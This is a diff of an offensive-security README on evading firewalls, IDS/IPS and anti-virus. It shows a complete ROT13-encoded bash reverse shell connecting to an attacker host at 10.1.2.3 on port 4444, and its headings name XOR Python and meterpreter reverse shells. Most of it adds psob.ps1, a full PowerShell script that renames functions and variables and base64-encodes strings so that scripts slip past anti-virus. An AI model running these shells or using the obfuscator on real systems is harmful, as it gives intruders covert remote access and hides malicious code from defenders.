@@ -7,7 +7,7 @@ Acronyms used:
 * IPS - Intrusion Prevention System.  A device that detects and blocks malicious network traffic.
 * A/V - Anti-Virus, Anti-Malware, etc.
 
-## ROT13 encoded reverse shell using bash TCP device
+## >> ROT13 encoded reverse shell using bash TCP device
 
 This technique is useful for getting a Linux reverse shell through a UTM firewall, IDS or IPS.
 
@@ -23,7 +23,7 @@ In this example the attacking host is on IP address 10.1.2.3 and listens on port
 [ linux command ]<br />
 `exec 5<>/dev/tcp/10.1.2.3/4444; /bin/bash 2>&1 <(while read -r lin; do echo $(echo $lin | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m'); done <&5) | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m' >&5; exec 5<&-`<br />
 
-## XOR obfuscated reverse shell using python
+## >> XOR obfuscated reverse shell using python
 
 This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS on a system supporting Python.
 
@@ -78,7 +78,7 @@ while True:
 s.close()
 ```
 
-## Circumventing A/V on Windows to get meterpreter reverse shell
+## >> Circumventing A/V on Windows to get meterpreter reverse shell
 
 This technique is useful for getting a reverse shell on Windows where endpoint A/V protection is in place that blocks malicious DLLs and blocks malicious network connections such as the default meterpreter reverse_https SSL server certificate.
 
@@ -280,3 +280,312 @@ The user is redirected to a real device's login page.<br />
 The script prints the captured credentials then waits for other login attempts.<br />
 ![alt text](https://github.com/billchaison/evasion/blob/master/wc05.png)
 
+## >> Obfuscating PowerShell Scripts
+
+This script (psob.ps1) utilizes PowerShell's Abstract Syntax Tree (AST) parser to produce obfuscated scripts to attempt evasion of anti-virus software.  The script reads a source file and removes single line comments, obfuscates parameters, variables, function names and string constants.  It is experimental and may need tweaks, test your output script prior to using it and make manual adjustments as needed.
+
+Usage: `powershell.exe psob.ps1 c:\files\in.ps1 c:\files\out.ps1`
+
+```powershell
+if(!($args.Count -eq 2))
+{
+   Write-Output "You must provide the <input file> and <output file> as arguments."
+   Write-Output "(e.g.) powershell.exe psob.ps1 c:\files\in.ps1 c:\files\out.ps1"
+   return
+}
+
+$InFile = $args[0]
+$OutFile = $args[1]
+
+Function RandomStr
+{
+   Param(
+   [Parameter(Position = 0, Mandatory = $true)]
+   [String]$Length
+   )
+
+   return -join (((0x61..0x7a) * 10) | Get-Random -Count $Length | % {[char]$_})
+}
+
+Function Base64Encode
+{
+   Param(
+   [Parameter(Position = 0, Mandatory = $true)]
+   [String]$Text
+   )
+
+   $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
+   return [Convert]::ToBase64String($Bytes)
+}
+
+Write-Output "[+] Syntax checking $InFile"
+try
+{
+   $contents = Get-Content -Path $InFile -ErrorAction Stop
+   $Errors = $null
+   $null = [System.Management.Automation.PSParser]::Tokenize($contents, [ref]$Errors)
+   if($Errors.Count -gt 0) { throw }
+   Write-Output "[+] Source file syntax check passed."
+}
+catch
+{
+   Write-Output "[-] Source file syntax check failed."
+   Break
+}
+
+Write-Output "[+] Parsing the source file."
+$AST = [System.Management.Automation.Language.Parser]::ParseFile($InFile, [ref]$null, [ref]$null)
+
+Write-Output "[+] Gathering function names."
+$Funcs = @{}
+$AST.FindAll({$args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst]}, $true) | Foreach { if($_.Name -ne "main") { if($Funcs.ContainsKey($_.Extent.StartLineNumber)) { $null = $Funcs[$_.Extent.StartLineNumber].Add($_.Name); $null = $Funcs[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Funcs[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Funcs[$_.Extent.StartLineNumber].Add($_.Name); $null = $Funcs[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}
+
+Write-Output "[+] Generating function map."
+$FuncMap = @{}
+$FuncMapCollisions = @{}
+Foreach($Key in $Funcs.Keys)
+{
+   $Arr = $Funcs.$Key
+   for($i = 0; $i -lt $Arr.Count; $i += 2)
+   {
+      for($j = 0; $j -lt 5; $j++)
+      {
+         $newfunc = RandomStr $Arr[$i].Length
+         if(!$FuncMapCollisions.ContainsKey($newfunc))
+         {
+            $FuncMapCollisions[$newfunc] = ""
+            $FuncMap[$Arr[$i]] = $newfunc
+            break
+         }
+      }
+      if($j -eq 5)
+      {
+         Write-Output "[-] Function map collision error."
+         return
+      }
+   }
+}
+
+Write-Output "[+] Gathering function use."
+$Cmds = @{}
+$AST.FindAll({$args[0] -is [System.Management.Automation.Language.CommandAst]}, $true) | Foreach { if($Cmds.ContainsKey($_.Extent.StartLineNumber)) { $null = $Cmds[$_.Extent.StartLineNumber].Add($_.GetCommandName()); $null = $Cmds[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Cmds[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Cmds[$_.Extent.StartLineNumber].Add($_.GetCommandName()); $null = $Cmds[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}
+
+Write-Output "[+] Gathering variable names."
+$AutoVars = @('$$', '$?', '$^', '$_', '$allnodes', '$args', '$consolefilename', '$error', '$event', '$eventargs', '$eventsubscriber', '$executioncontext', '$false', '$foreach', '$home', '$host', '$input', '$lastexitcode', '$myinvocation', '$nestedpromptlevel', '$null', '$ofs', '$pid', '$profile', '$psboundparameters', '$pscmdlet', '$pscommandpath', '$psculture', '$psdebugcontext', '$pshome', '$psitem', '$psscriptroot', '$pssenderinfo', '$psuiculture', '$psversiontable', '$pwd', '$sender', '$shellid', '$sourceargs', '$sourceeventargs', '$stacktrace', '$this', '$true')
+$Vars = @{}
+$AST.FindAll({$args[0] -is [System.Management.Automation.Language.VariableExpressionAst]}, $true) | foreach { if(!($AutoVars -contains $_.Extent.Text)) { if($Vars.ContainsKey($_.Extent.StartLineNumber)) { $null = $Vars[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $Vars[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Vars[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Vars[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $Vars[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}
+
+Write-Output "[+] Generating parameter exclusions."
+$VarSkip = New-Object -TypeName "System.Collections.ArrayList"
+$AST.FindAll({$args[0].GetType().Name -like "ParamBlockAst"}, $true) | foreach { $null = $VarSkip.Add(-join($_.Extent.StartLineNumber, ":", $_.Extent.EndLineNumber)) }
+
+Function ProtectedVar
+{
+   Param(
+   [Parameter(Position = 0, Mandatory = $true)]
+   [Int32]$num
+   )
+
+   Foreach($i in $VarSkip)
+   {
+      $j = $i -split ":"
+      if($num -ge $j[0] -and $num -le $j[1]) { return $true }
+   }
+   return $false
+}
+
+$VarSkipMap = @{}
+$ParamMap = @{}
+$VarMapCollisions = @{}
+Foreach($Key in $Vars.Keys)
+{
+   if(ProtectedVar $Key)
+   {
+      $Arr = $Vars.$Key
+      for($i = 0; $i -lt $Arr.Count; $i += 2)
+      {
+         $p = -join('-', $Arr[$i].SubString(1))
+         for($j = 0; $j -lt 5; $j++)
+         {
+            $x = (RandomStr ($Arr[$i].Length - 1))
+            $newvar = -join('$', $x)
+            $newparam = -join('-', $x)
+            if(!$VarMapCollisions.ContainsKey($newvar))
+            {
+               $VarMapCollisions[$newvar] = ""
+               $VarSkipMap[$Arr[$i]] = $newvar
+               $ParamMap[$p] = $newparam
+               break
+            }
+         }
+         if($j -eq 5)
+         {
+            Write-Output "[-] Variable parameter map collision error."
+            return
+         }
+      }
+   }
+}
+
+Write-Output "[+] Gathering function parameter use."
+$CmdParams = @{}
+$AST.FindAll({$args[0].GetType().Name -like "CommandParameterAst"}, $true) | foreach { if($ParamMap.Keys -contains $_.Extent.Text) { if($CmdParams.ContainsKey($_.Extent.StartLineNumber)) { $null = $CmdParams[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $CmdParams[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $CmdParams[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $CmdParams[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $CmdParams[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}
+
+Write-Output "[+] Generating variable map."
+$VarMap = @{}
+$VarToMap = $Vars.values | Foreach { $_ | Select-String -pattern "^\$" } | Select -Unique | Foreach { $a = $_.ToString(); if(!$VarSkipMap.ContainsKey($a)) { $a } }
+Foreach($v in $VarToMap)
+{
+   for($i = 0; $i -lt 5; $i++)
+   {
+      $newvar = -join('$', (RandomStr ($v.Length - 1)))
+      if(!$VarMapCollisions.ContainsKey($newvar))
+      {
+         $VarMapCollisions[$newvar] = ""
+         $VarMap[$v] = $newvar
+         break
+      }
+   }
+   if($i -eq 5)
+   {
+      Write-Output "[-] Variable map collision error."
+      return
+   }
+}
+
+Write-Output "[+] Generating string to base64 map."
+$Strs = @{}
+$StrToB64 = @{}
+$AST.FindAll({$args[0].GetType().Name -like "StringConstantExpressionAst"}, $true) | foreach { if(($_.StringConstantType -ceq "DoubleQuoted" -or $_.StringConstantType -ceq "SingleQuoted") -and ($_.Extent.Text -ne '""' -and $_.Extent.Text -ne "''" -and $_.Extent.Text.Length -gt 3)) { if($Strs.ContainsKey($_.Extent.StartLineNumber)) { $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) } else { $Strs[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) }}}
+#$AST.FindAll({$args[0].GetType().Name -like "StringConstantExpressionAst"}, $true) | foreach { if(($_.StringConstantType -ceq "DoubleQuoted") -and ($_.Extent.Text -ne '""' -and $_.Extent.Text -ne "''" -and $_.Extent.Text.Length -gt 3)) { if($Strs.ContainsKey($_.Extent.StartLineNumber)) { $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) } else { $Strs[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) }}}
+$SwitchStrs = $AST.FindAll({$args[0].GetType().Name -like "SwitchStatementAst"}, $true) | foreach { $_.Clauses.Item1.Extent } | foreach { $_.StartLineNumber }
+Foreach($Key in $Strs.Keys)
+{
+   if(!(ProtectedVar $Key) -and !($SwitchStrs -Contains $Key))
+   {
+      $StrToB64[$Key] = New-Object -TypeName "System.Collections.ArrayList"
+      Foreach($i in $Strs[$Key])
+      {
+         $null = $StrToB64[$Key].Add($i)
+         $j = $i.Substring(1, $i.Length - 2)
+         $k = Base64Encode $j
+         $m = -join('([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("', $k, '")))')
+         $null = $StrToB64[$Key].Add($m)
+      }
+   }
+}
+
+Write-Output "[+] Generating the output file."
+$PSObfuscated = New-Object -TypeName "System.Collections.ArrayList"
+$num = 1
+Foreach($line in Get-Content $InFile)
+{
+   $temp = $line
+   if(!($temp -match "^[`t ]*#"))
+   {
+   if($Cmds.ContainsKey($num))
+   {
+      $Arr = $Cmds[$num]
+      for($i = 0; $i -lt $Arr.Count; $i += 2)
+      {
+         if($FuncMap.ContainsKey($Arr[$i]))
+         {
+            $j = ($Arr[$i + 1]).Split(":")
+            $temp = $temp.remove(($j[0] - 1), $Arr[$i].Length).insert(($j[0] - 1), $FuncMap[$Arr[$i]])
+         }
+      }
+   }
+   if($Vars.ContainsKey($num))
+   {
+      $Arr = $Vars[$num]
+      for($i = 0; $i -lt $Arr.Count; $i += 2)
+      {
+         if($VarMap.ContainsKey($Arr[$i]))
+         {
+            $j = ($Arr[$i + 1]).Split(":")
+            $temp = $temp.remove(($j[0] - 1), $Arr[$i].Length).insert(($j[0] - 1), $VarMap[$Arr[$i]])
+         }
+      }
+   }
+   if($Funcs.ContainsKey($num))
+   {
+      $i = 0;
+      $Arr = $Funcs[$num] | foreach { if(!($i++ % 2)) { $_ }} | sort length -desc
+      Foreach($j in $Arr)
+      {
+         $temp = $temp -replace $j, $FuncMap[$j]
+      }
+   }
+   if(ProtectedVar $num)
+   {
+      if($Vars.ContainsKey($num))
+      {
+         $Arr = $Vars[$num]
+         for($i = 0; $i -lt $Arr.Count; $i += 2)
+         {
+            $k = $Arr[$i]
+            $j = ($Arr[$i + 1]).Split(":")
+            if($VarSkipMap.ContainsKey($k))
+            {
+               $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $VarSkipMap[$k])
+            }
+         }
+      }
+   }
+   else
+   {
+      if($Vars.ContainsKey($num))
+      {
+         $Arr = $Vars[$num]
+         for($i = 0; $i -lt $Arr.Count; $i += 2)
+         {
+            $k = $Arr[$i]
+            $j = ($Arr[$i + 1]).Split(":")
+            if($VarSkipMap.ContainsKey($k))
+            {
+               $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $VarSkipMap[$k])
+            }
+         }
+      }
+   }
+   if($CmdParams.ContainsKey($num))
+   {
+      $Arr = $CmdParams[$num]
+      for($i = 0; $i -lt $Arr.Count; $i += 2)
+      {
+         if($ParamMap.ContainsKey($Arr[$i]))
+         {
+            $k = $Arr[$i]
+            $j = ($Arr[$i + 1]).Split(":")
+            if(($FuncMap.Values | %{$temp.contains($_)}) -contains $true)
+            {
+               $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $ParamMap[$k])
+            }
+         }
+      }
+   }
+   if($StrToB64.ContainsKey($num))
+   {
+      $Arr = $StrToB64[$num]
+      for($i = 0; $i -lt $Arr.Count; $i += 2)
+      {
+         $temp = $temp -Replace $Arr[$i], $Arr[$i + 1]
+      }
+   }
+   $null = $PSObfuscated.Add($temp)
+   }
+   $num++
+}
+try
+{
+   $PSObfuscated | Out-File -FilePath $OutFile -ErrorAction Stop
+   Write-Output "[+] Output file created successfully, $OutFile."
+   Write-Output "    Manual edits might be needed:"
+   Write-Output "    > Change 'DefaultParameterSetName' and 'ParameterSetName' strings."
+   Write-Output "    > Remove multi-line comment blocks."
+}
+catch
+{
+   Write-Output "[-] Failed to create output file."
+}
+```
